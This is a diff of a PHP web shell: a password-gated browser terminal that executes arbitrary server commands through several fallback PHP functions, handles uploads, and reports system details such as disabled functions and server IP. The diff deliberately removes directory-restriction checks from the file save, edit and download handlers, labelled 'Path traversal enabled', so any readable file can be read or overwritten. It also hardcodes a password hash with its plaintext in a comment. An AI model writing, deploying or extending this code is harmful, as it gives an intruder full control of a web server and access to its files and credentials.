@@ -4,14 +4,16 @@ date_default_timezone_set('Asia/Manila');
 ini_set('log_errors', 1);
 ini_set('error_log', __DIR__ . '/term_error_log');
 error_reporting(E_ALL);
-ini_set('display_errors', 0);
+ini_set('display_errors', 0); // Keep this off for production
 set_time_limit(0);
 
+// OS Detection
 $is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
 
 // --- Updated: MD5 Password ---
-$default_password_hash = '2ebba5cd75576c408240e57110e7b4ff'; // Replace with the MD5 hash of your chosen password (current is for "myp@ssw0rd")
+$default_password_hash = '152f90e55597001071345e8a037d5c4e'; // MD5 for "Pinoy404!"
 
+// Check if a function is enabled (not disabled)
 function is_function_enabled($func) {
     if (!function_exists($func)) {
         return false;
@@ -21,6 +23,7 @@ function is_function_enabled($func) {
     return !in_array($func, $disabled);
 }
 
+// --- Updated: Flexible Command Execution ---
 function execute_command($command, $cwd) {
     global $is_windows;
 
@@ -28,13 +31,15 @@ function execute_command($command, $cwd) {
         ? 'cd /d ' . escapeshellarg($cwd) . ' && ' . $command . ' 2>&1'
         : 'cd ' . escapeshellarg($cwd) . ' && ' . $command . ' 2>&1';
 
+    // error_log("Attempting command: $full_command"); // Commented out: Reduces verbosity
     $output = '';
 
     if (is_function_enabled('proc_open')) {
+        // error_log("Using proc_open"); // Commented out: Reduces verbosity
         $descriptorspec = [
-           0 => ["pipe", "r"],
-           1 => ["pipe", "w"],
-           2 => ["pipe", "w"]
+           0 => ["pipe", "r"],  // stdin
+           1 => ["pipe", "w"],  // stdout
+           2 => ["pipe", "w"]   // stderr
         ];
         $pipes = [];
         $process = proc_open($full_command, $descriptorspec, $pipes, $cwd);
@@ -42,30 +47,34 @@ function execute_command($command, $cwd) {
             fclose($pipes[0]);
             $output .= stream_get_contents($pipes[1]);
             fclose($pipes[1]);
-            $output .= stream_get_contents($pipes[2]);
+            $output .= stream_get_contents($pipes[2]); // Capture stderr too
             fclose($pipes[2]);
             proc_close($process);
         } else {
-            error_log("proc_open failed for command: $full_command");
+            error_log("proc_open failed for command: $full_command"); // Log actual error
             $output = "Error: proc_open failed.";
         }
     } elseif (is_function_enabled('shell_exec')) {
+        // error_log("Using shell_exec"); // Commented out: Reduces verbosity
         $output = shell_exec($full_command);
     } elseif (is_function_enabled('passthru')) {
+        // error_log("Using passthru"); // Commented out: Reduces verbosity
         ob_start();
         passthru($full_command, $return_var);
         $output = ob_get_contents();
         ob_end_clean();
     } elseif (is_function_enabled('system')) {
+        // error_log("Using system"); // Commented out: Reduces verbosity
         ob_start();
         system($full_command, $return_var);
         $output = ob_get_contents();
         ob_end_clean();
     } elseif (is_function_enabled('exec')) {
+        // error_log("Using exec"); // Commented out: Reduces verbosity
         exec($full_command, $output_array, $return_var);
         $output = implode("\n", $output_array);
     } else {
-        error_log("All command execution functions are disabled. Cannot execute: $full_command");
+        error_log("All command execution functions are disabled. Cannot execute: $full_command"); // Log actual error
         $output = "Error: All command execution functions are disabled.";
     }
 
@@ -75,57 +84,55 @@ function execute_command($command, $cwd) {
     return htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
 }
 
+// --- Consolidated POST Request Handling ---
 $login_error = '';
 $upload_message = '';
 
+// Handle logout first
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['logout'])) {
     session_destroy();
     header('Location: ' . $_SERVER['PHP_SELF']);
     exit;
 }
 
+// Determine login status (will be updated after login attempt)
 $is_logged_in = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
 
+// Handle login attempt
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
     if (md5($_POST['password']) === $default_password_hash) {
         $_SESSION['authenticated'] = true;
-        $is_logged_in = true;
+        $is_logged_in = true; // Update login status for current request
         $_SESSION['cwd'] = getcwd();
-        header('Location: ' . $_SERVER['PHP_SELF']);
+        header('Location: ' . $_SERVER['PHP_SELF']); // Redirect to clear POST data
         exit;
     } else {
         $login_error = 'Invalid password.';
-        error_log("Failed login attempt with password: " . $_POST['password']);
+        error_log("Failed login attempt with password: " . $_POST['password']); // Keep this important security log
+        // $is_logged_in remains false, login form will be shown.
     }
 }
 
+// Handle AJAX actions (command, save_file) - these require login and will exit with JSON
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && $is_logged_in) {
     if (isset($_POST['action']) && $_POST['action'] === 'save_file') {
         header('Content-Type: application/json');
         $response = ['output' => '', 'cwd' => $_SESSION['cwd']];
-        $file_to_save = $_POST['filepath'];
+        // --- MODIFIED: Path traversal enabled ---
+        // The filepath from the client is now treated as the absolute path to save to.
+        $full_path = $_POST['filepath'];
         $content = $_POST['content'];
-        $current_real_cwd = realpath($_SESSION['cwd']);
-        $full_path = $current_real_cwd . DIRECTORY_SEPARATOR . $file_to_save;
-        $full_path_dir_normalized = realpath(dirname($full_path));
 
-        if (!$full_path_dir_normalized || strpos($full_path_dir_normalized, $current_real_cwd) !== 0) {
-             if ($full_path_dir_normalized !== $current_real_cwd) {
-                $response['output'] = htmlspecialchars("Error: Cannot save outside current directory (" . $file_to_save . "). CWD: " . $current_real_cwd . " Target Dir: " . $full_path_dir_normalized, ENT_QUOTES, 'UTF-8');
-             } elseif (file_put_contents($full_path, $content) !== false) {
-                $response['output'] = htmlspecialchars("File saved: " . $file_to_save, ENT_QUOTES, 'UTF-8');
-             } else {
-                error_log("Failed to save file (in CWD): $full_path");
-                $response['output'] = htmlspecialchars("Error: Failed to save file (in CWD).", ENT_QUOTES, 'UTF-8');
-             }
-        } elseif (file_put_contents($full_path, $content) !== false) {
-            $response['output'] = htmlspecialchars("File saved: " . $file_to_save, ENT_QUOTES, 'UTF-8');
+        // No more security checks, just attempt to write the file
+        if (file_put_contents($full_path, $content) !== false) {
+            $response['output'] = htmlspecialchars("File saved: " . $full_path, ENT_QUOTES, 'UTF-8');
         } else {
             error_log("Failed to save file: $full_path");
-            $response['output'] = htmlspecialchars("Error: Failed to save file.", ENT_QUOTES, 'UTF-8');
+            $response['output'] = htmlspecialchars("Error: Failed to save file to " . $full_path, ENT_QUOTES, 'UTF-8');
         }
         echo json_encode($response);
         exit;
+
     } elseif (isset($_POST['command'])) {
         header('Content-Type: application/json');
         $response = ['output' => '', 'cwd' => $_SESSION['cwd']];
@@ -139,17 +146,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $is_logged_in) {
 
             if (empty($target_dir_param) || $target_dir_param === '~') {
                 $target_dir_to_resolve = getenv('HOME') ?: getenv('USERPROFILE');
-                if (!$target_dir_to_resolve) {
+                if (!$target_dir_to_resolve) { // Fallback if HOME/USERPROFILE is not set
                     $target_dir_to_resolve = $is_windows ? (getenv('SystemDrive') . '\\') : '/';
                 }
             }
+            // For realpath to work correctly with relative paths, change PHP's CWD temporarily
             $original_php_cwd = getcwd();
-            if (@chdir($_SESSION['cwd'])) {
+            if (@chdir($_SESSION['cwd'])) { // Change to terminal's CWD
                 $new_dir = realpath($target_dir_to_resolve);
-                @chdir($original_php_cwd);
+                @chdir($original_php_cwd); // Restore PHP's CWD
             } else {
-                 error_log("cd: Failed to chdir to session CWD: " . $_SESSION['cwd']);
-                 $new_dir = false;
+                 error_log("cd: Failed to chdir to session CWD: " . $_SESSION['cwd']); // Keep actual error log
+                 $new_dir = false; // Could not change to session CWD to resolve path
             }
 
             if ($new_dir && is_dir($new_dir) && is_readable($new_dir)) {
@@ -159,31 +167,41 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $is_logged_in) {
                 $response['output'] = htmlspecialchars("Error: Cannot change directory to '$target_dir_param'. Resolved attempt: '$target_dir_to_resolve'. Result: '" . ($new_dir ?: 'path not found') . "'", ENT_QUOTES, 'UTF-8');
             }
         } elseif (preg_match('/^\s*edit\s+([\S]+)/i', $command, $matches)) {
+            // --- MODIFIED: Path traversal enabled ---
             $file_to_edit = trim($matches[1]);
-            $current_real_cwd = realpath($_SESSION['cwd']);
-            $full_path = $current_real_cwd . DIRECTORY_SEPARATOR . $file_to_edit;
-            $full_path_resolved = realpath($full_path);
+            
+            // Determine if path is absolute or relative
+            $is_absolute = ($file_to_edit[0] === '/' || ($is_windows && preg_match('/^[a-zA-Z]:[\\\\\/]/', $file_to_edit)));
+            $full_path = $is_absolute ? $file_to_edit : $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $file_to_edit;
 
-            if ($full_path_resolved && is_file($full_path_resolved) && is_readable($full_path_resolved) && strpos($full_path_resolved, $current_real_cwd) === 0) {
-                 $content = file_get_contents($full_path_resolved);
-                 $response['action'] = 'edit';
-                 $response['filepath'] = $file_to_edit;
-                 $response['content'] = $content;
+            // Try to read the file, but don't fail if it doesn't exist
+            if (is_file($full_path) && is_readable($full_path)) {
+                $content = file_get_contents($full_path);
+                $response['output'] = htmlspecialchars("Editing existing file: " . $file_to_edit, ENT_QUOTES, 'UTF-8');
             } else {
-                 $response['output'] = htmlspecialchars("Error: Cannot read file '$file_to_edit'. Check path/permissions. Attempted: $full_path", ENT_QUOTES, 'UTF-8');
+                $content = ''; // New file is empty
+                $response['output'] = htmlspecialchars("Opening new or unreadable file for editing: " . $file_to_edit, ENT_QUOTES, 'UTF-8');
             }
-        } elseif (preg_match('/^\s*download\s+([\S]+)/i', $command, $matches)) {
-            $file_to_download = trim($matches[1]);
-            $current_real_cwd = realpath($_SESSION['cwd']);
-            $intended_full_path = $current_real_cwd . DIRECTORY_SEPARATOR . $file_to_download;
-            $full_path_resolved = realpath($intended_full_path);
 
-            if ($full_path_resolved && is_file($full_path_resolved) && is_readable($full_path_resolved) && strpos($full_path_resolved, $current_real_cwd) === 0) {
+            $response['action'] = 'edit';
+            $response['filepath'] = $full_path; // Send the full path to be used for saving
+            $response['content'] = $content;
+            
+        } elseif (preg_match('/^\s*download\s+([\S]+)/i', $command, $matches)) {
+            // --- MODIFIED: Path traversal enabled ---
+            $file_to_download = trim($matches[1]);
+
+            // Determine if path is absolute or relative
+            $is_absolute = ($file_to_download[0] === '/' || ($is_windows && preg_match('/^[a-zA-Z]:[\\\\\/]/', $file_to_download)));
+            $full_path = $is_absolute ? $file_to_download : $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $file_to_download;
+            
+            // Just check if file exists and is readable, no path restrictions
+            if (is_file($full_path) && is_readable($full_path)) {
                  $response['action'] = 'download';
-                 $response['filepath'] = base64_encode($file_to_download);
-                 $response['output'] = htmlspecialchars("Preparing download for $file_to_download...", ENT_QUOTES, 'UTF-8');
+                 $response['filepath'] = base64_encode($full_path); // Send the full path for the GET request
+                 $response['output'] = htmlspecialchars("Preparing download for " . basename($full_path) . "...", ENT_QUOTES, 'UTF-8');
              } else {
-                 $response['output'] = htmlspecialchars("Error: Cannot access file '$file_to_download' for download. Attempted: $intended_full_path", ENT_QUOTES, 'UTF-8');
+                 $response['output'] = htmlspecialchars("Error: Cannot access file '$file_to_download' for download. Attempted: $full_path", ENT_QUOTES, 'UTF-8');
              }
         } else {
             $exec_command = $command;
@@ -198,16 +216,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $is_logged_in) {
     }
 }
 
+// Handle file upload (standard POST, not AJAX, requires login)
+// This runs if it's a POST, user is logged in, AND it wasn't an AJAX action handled above.
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file']) && $is_logged_in) {
-    $upload_dir_target = $_SESSION['cwd'];
+    $upload_dir_target = $_SESSION['cwd']; // Try CWD first
 
+    // Check if CWD is writable, otherwise use fallback.
     if (!is_dir($upload_dir_target) || !is_writable($upload_dir_target)) {
+        // error_log("CWD ".$upload_dir_target." not writable for upload. Trying fallback."); // Commented out informational log
         $upload_dir_target = __DIR__ . DIRECTORY_SEPARATOR . 'uploads';
         if (!is_dir($upload_dir_target)) {
             if (!@mkdir($upload_dir_target, 0755, true)) {
-                error_log("Failed to create fallback upload directory: " . $upload_dir_target);
+                error_log("Failed to create fallback upload directory: " . $upload_dir_target); // Keep actual error log
                 $upload_message = "Error: Could not create upload directory. Please check server permissions.";
-                $upload_dir_target = null;
+                $upload_dir_target = null; // Mark as failed
             }
         }
     }
@@ -224,52 +246,57 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file']) && $is_logge
                 $upload_message = "File uploaded to " . htmlspecialchars(realpath($upload_dir_target), ENT_QUOTES, 'UTF-8') . DIRECTORY_SEPARATOR . htmlspecialchars($file_name_sanitized, ENT_QUOTES, 'UTF-8');
             } else {
                 $upload_message = "Error: Failed to move uploaded file to " . htmlspecialchars(realpath($upload_dir_target) ?: $upload_dir_target, ENT_QUOTES, 'UTF-8') . ". Check permissions. PHP error: " . $_FILES['file']['error'];
-                error_log("File upload error (move_uploaded_file): " . $_FILES['file']['error'] . " to target " . $target_file);
+                error_log("File upload error (move_uploaded_file): " . $_FILES['file']['error'] . " to target " . $target_file); // Keep actual error log
             }
         }
-    } elseif (!$upload_message) {
+    } elseif (!$upload_message) { // Only set if not already set by mkdir failure
         $upload_message = "Error: Upload directory (" . htmlspecialchars($upload_dir_target ?: $_SESSION['cwd'], ENT_QUOTES, 'UTF-8') . ") is not writable or does not exist.";
-        error_log("Upload directory not writable/exists: " . ($upload_dir_target ?: $_SESSION['cwd']));
+        error_log("Upload directory not writable/exists: " . ($upload_dir_target ?: $_SESSION['cwd'])); // Keep actual error log
     }
+    // After file upload, the script will continue to render the full HTML page.
 }
+// --- END POST Request Handling ---
 
+
+// Initialize or update CWD in session
 if ($is_logged_in && !isset($_SESSION['cwd'])) {
     $_SESSION['cwd'] = getcwd();
 }
 
+// --- MODIFIED: Path traversal enabled for downloads ---
+// Handle File Download (GET Request)
 if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['download']) && $is_logged_in) {
     $file_path_b64 = $_GET['download'];
-    $file_path_relative = base64_decode($file_path_b64);
+    $full_path = base64_decode($file_path_b64); // This is now the full path
 
-    if ($file_path_relative === false || empty($file_path_relative) || strpos($file_path_relative, '..') !== false) {
-        error_log("Download attempt failed: Invalid or disallowed relative path '$file_path_relative'");
+    if ($full_path === false || empty($full_path)) {
+        error_log("Download attempt failed: Invalid base64-encoded path.");
         echo "Error: Invalid file path.";
         exit;
     }
-
-    $current_real_cwd = realpath($_SESSION['cwd']);
-    $full_path = $current_real_cwd . DIRECTORY_SEPARATOR . $file_path_relative;
-    $full_path_resolved = realpath($full_path);
-
-    if ($full_path_resolved && is_file($full_path_resolved) && is_readable($full_path_resolved) && strpos($full_path_resolved, $current_real_cwd) === 0) {
+    
+    // No more security checks, just check readability and existence
+    if (is_file($full_path) && is_readable($full_path)) {
         header('Content-Description: File Transfer');
         header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="' . basename($full_path_resolved) . '"');
+        header('Content-Disposition: attachment; filename="' . basename($full_path) . '"');
         header('Expires: 0');
         header('Cache-Control: must-revalidate');
         header('Pragma: public');
-        header('Content-Length: ' . filesize($full_path_resolved));
-        ob_clean();
-        flush();
-        readfile($full_path_resolved);
+        header('Content-Length: ' . filesize($full_path));
+        ob_clean(); // Clean any previous output
+        flush();    // Flush system output buffer
+        readfile($full_path);
         exit;
     } else {
-        error_log("Download attempt failed: Relative '$file_path_relative' from CWD '{$_SESSION['cwd']}'. Resolved to '$full_path_resolved'. Access denied or not found.");
+        error_log("Download attempt failed for path: '$full_path'. Not a file or not readable.");
         echo "Error: File not found or access denied.";
         exit;
     }
 }
 
+
+// If not logged in, show login form
 if (!$is_logged_in) {
 ?>
 <!DOCTYPE html>
@@ -280,11 +307,12 @@ if (!$is_logged_in) {
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body { background: #0a0a0a; color: #00ff00; font-family: 'Orbitron', 'Courier New', monospace; margin: 0; padding: 20px; text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; }
-        .login-container { max-width: 400px; margin: 50px auto; text-align: center; background: #1a1a1a; padding: 20px; border: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00, 0 0 30px #00ff00; border-radius: 5px; }
+        .login-container { max-width: 400px; margin: 50px auto; /* Reduced margin-top for image */ text-align: center; background: #1a1a1a; padding: 20px; border: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00, 0 0 30px #00ff00; border-radius: 5px; }
         input[type="password"], input[type="text"] { width: 100%; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: 'Orbitron', 'Courier New', monospace; text-shadow: 0 0 5px #00ff00; box-shadow: inset 0 0 5px #00ff00; box-sizing: border-box; }
         input[type="submit"] { background: #00ff00; color: #000; border: none; padding: 8px 15px; cursor: pointer; font-family: 'Orbitron', 'Courier New', monospace; text-shadow: none; box-shadow: 0 0 10px #00ff00; border-radius: 3px; margin-top: 10px; }
         input[type="submit"]:hover { background: #00cc00; box-shadow: 0 0 15px #00cc00; }
         .error { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
+        /* Image container is now outside .login-container, so it needs its own centering and spacing */
         .login-image-wrapper { text-align: center; margin-top: 20px; }
     </style>
 </head>
@@ -309,9 +337,10 @@ if (!$is_logged_in) {
     exit;
 }
 
+// Gather system information for header
 $uname = function_exists('shell_exec') && is_function_enabled('shell_exec') ? (shell_exec($is_windows ? 'ver 2>&1' : 'uname -a 2>&1') ?: 'N/A') : 'N/A';
 $disabled_functions = ini_get('disable_functions') ?: 'None';
-$safe_mode = ini_get('safe_mode') ? 'On' : 'Off';
+$safe_mode = ini_get('safe_mode') ? 'On' : 'Off'; // Note: safe_mode is deprecated since PHP 5.4
 $php_version = phpversion();
 $server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (function_exists('gethostbyname') ? gethostbyname(gethostname()) : 'N/A');
 $client_ip = $_SERVER['REMOTE_ADDR'];
@@ -346,9 +375,11 @@ $cwd = $_SESSION['cwd'];
         .prompt { color: #00ff00; text-shadow: 0 0 5px #00ff00; margin-right: 5px; white-space: nowrap; }
         #command, #custom_shell { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: 'Orbitron', 'Courier New', monospace; text-shadow: 0 0 5px #00ff00; box-shadow: inset 0 0 5px #00ff00; box-sizing: border-box; }
         #command { flex-grow: 1; }
-        #custom_shell { width: 150px; }
+        /* CSS for custom_shell input itself */
+        #custom_shell { width: 150px; } /* Removed margin-left here, it's on the wrapper */
         .custom-shell-group { margin-left: 10px; text-align: center; display: flex; flex-direction: column; align-items: center; }
         .custom-shell-group label { font-size: 0.8em; margin-top: 4px; display:block; }
+
         .error { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
         .action-btn, .logout-btn { background: #00ff00; color: #000; border: none; padding: 8px 15px; cursor: pointer; font-family: 'Orbitron', 'Courier New', monospace; text-shadow: none; box-shadow: 0 0 10px #00ff00; border-radius: 3px; margin-left: 10px; }
         .action-btn:hover, .logout-btn:hover { background: #00cc00; box-shadow: 0 0 15px #00cc00; }
@@ -401,7 +432,7 @@ $cwd = $_SESSION['cwd'];
         </form>
         <?php if (isset($upload_message) && !empty($upload_message)) { ?>
             <p style="margin-top: 5px;" class="<?php echo strpos($upload_message, 'Error') === 0 ? 'error' : ''; ?>">
-                <?php echo $upload_message; ?>
+                <?php echo $upload_message; // Already HTML-escaped in PHP ?>
             </p>
         <?php } ?>
     </div>
@@ -432,11 +463,11 @@ $cwd = $_SESSION['cwd'];
         var historyIndex = -1;
 
         commandInput.addEventListener('keydown', function(e) {
-            if (e.keyCode === 13) {
+            if (e.keyCode === 13) { // Enter key
                 e.preventDefault();
                 var command = commandInput.value.trim();
                 if (command !== '') {
-                    appendToTerminalOutput('$ ' + command);
+                    appendToTerminalOutput('$ ' + command); // Display command typed
                     commandHistory.push(command);
                     historyIndex = commandHistory.length;
 
@@ -447,7 +478,7 @@ $cwd = $_SESSION['cwd'];
                     }
                     commandInput.value = '';
                 }
-            } else if (e.keyCode === 38) {
+            } else if (e.keyCode === 38) { // Up arrow
                 e.preventDefault();
                 if (historyIndex > 0) {
                     historyIndex--;
@@ -455,23 +486,24 @@ $cwd = $_SESSION['cwd'];
                     commandInput.focus();
                     commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length);
                 }
-            } else if (e.keyCode === 40) {
+            } else if (e.keyCode === 40) { // Down arrow
                  e.preventDefault();
                 if (historyIndex < commandHistory.length - 1) {
                     historyIndex++;
                     commandInput.value = commandHistory[historyIndex];
                 } else if (historyIndex === commandHistory.length - 1) {
                      historyIndex++;
-                     commandInput.value = '';
+                     commandInput.value = ''; // Clear if at end of history
                 }
                 commandInput.focus();
                 commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length);
             }
         });
 
+        // Function to append text (already HTML escaped by PHP or pre-formatted) to the terminal
         function appendToTerminal(htmlContent, isError) {
             var p = document.createElement('p');
-            p.innerHTML = htmlContent;
+            p.innerHTML = htmlContent; // Assumes htmlContent is already escaped and newlines are <br>
             if (isError) {
                 p.className = 'error';
             }
@@ -479,6 +511,7 @@ $cwd = $_SESSION['cwd'];
             terminal.scrollTop = terminal.scrollHeight;
         }
 
+        // Function to append user-typed commands or simple messages (needs escaping)
         function appendToTerminalOutput(text, isError) {
             var p = document.createElement('p');
             var safeText = text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
@@ -492,7 +525,7 @@ $cwd = $_SESSION['cwd'];
 
 
         function updatePrompt(cwd) {
-            cwdSpan.textContent = cwd;
+            cwdSpan.textContent = cwd; // CWD from PHP is already htmlspecialchars'd
         }
 
         function sendCommand(command) {
@@ -504,13 +537,15 @@ $cwd = $_SESSION['cwd'];
                     try {
                         var response = JSON.parse(xhr.responseText);
                         if (response.output) {
+                            // PHP's htmlspecialchars already escapes output for HTML context.
+                            // The response.output is already escaped.
                             appendToTerminal(response.output.replace(/\n/g, '<br>'), response.output.indexOf('Error:') === 0 || response.output.indexOf('Error: ') !== -1);
                         }
                         if (response.cwd) {
                             updatePrompt(response.cwd);
                         }
                         if (response.action === 'edit') {
-                            openEditor(response.filepath, response.content);
+                            openEditor(response.filepath, response.content); // Content is raw
                         } else if (response.action === 'download') {
                              window.location.href = '<?php echo $_SERVER['PHP_SELF']; ?>?download=' + response.filepath;
                         }
@@ -526,9 +561,9 @@ $cwd = $_SESSION['cwd'];
         }
 
         function openEditor(filepath, content) {
-            currentFilePath = filepath;
+            currentFilePath = filepath; // filepath is now the full path sent by PHP
             editorFileNameSpan.textContent = 'Edit: ' + filepath;
-            editorContentTextarea.value = content;
+            editorContentTextarea.value = content; // content is raw
             editorModal.style.display = 'block';
             editorContentTextarea.focus();
         }
